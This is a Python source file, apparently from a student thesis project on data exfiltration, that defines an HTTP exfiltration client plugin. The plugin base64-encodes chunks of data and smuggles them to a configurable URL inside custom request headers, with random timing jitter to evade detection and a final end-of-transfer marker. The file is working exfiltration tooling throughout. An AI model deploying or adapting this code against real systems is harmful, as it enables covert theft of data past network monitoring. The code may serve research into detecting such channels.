from __future__ import annotations
from typing import Dict, Any, Iterable
import urllib.request, urllib.error
import base64, time, random

from tfg.plugins.api import ExfilClientPlugin

class HttpClientHeaders(ExfilClientPlugin):
    canal = "HTTP"
    metodo = 1
    name = "http_client_headers"

    def _send(self, req: urllib.request.Request, timeout: int) -> bytes:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read()

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        url = config.get("url")
        if not url:
            raise ValueError("Falta 'url' en config para HttpClientHeaders")
        exfil_id = config.get("exfil_id") or str(int(time.time()*1000))
        timeout = int(config.get("timeout_s") or 10)
        user_agent = config.get("user_agent") or "TFG-Exfil/1.1"
        auth_token = config.get("auth_token")
        ritmo_base = int(config.get("ritmo_base_ms") or 0)
        ritmo_disp = int(config.get("ritmo_dispersion_ms") or 0)

        sent_bytes = 0
        sent_frags = 0
        seq = 0
        for chunk in payload_iter:
            if ritmo_base or ritmo_disp:
                jitter = random.uniform(-ritmo_disp, ritmo_disp)
                time.sleep(max(0.0, (ritmo_base + jitter)/1000.0))
            b64 = base64.b64encode(chunk).decode("ascii")
            headers = {
                "User-Agent": user_agent,
                "X-Exfil-Id": exfil_id,
                "X-Exfil-Seq": str(seq),
                "X-Exfil-Data": b64,
                "Content-Type": "application/octet-stream",
            }
            if auth_token:
                headers["X-Auth-Token"] = auth_token
            req = urllib.request.Request(url=url, data=b"", headers=headers, method="POST")
            self._send(req, timeout)
            sent_bytes += len(chunk)
            sent_frags += 1
            seq += 1

        headers = {"User-Agent": user_agent, "X-Exfil-Id": exfil_id, "X-Exfil-Seq": str(seq), "X-Exfil-Last": "1"}
        if auth_token:
            headers["X-Auth-Token"] = auth_token
        req = urllib.request.Request(url=url, data=b"", headers=headers, method="POST")
        self._send(req, timeout)
        return {"ok": True, "plugin": self.name, "exfil_id": exfil_id, "sent_bytes": sent_bytes, "sent_fragments": sent_frags}
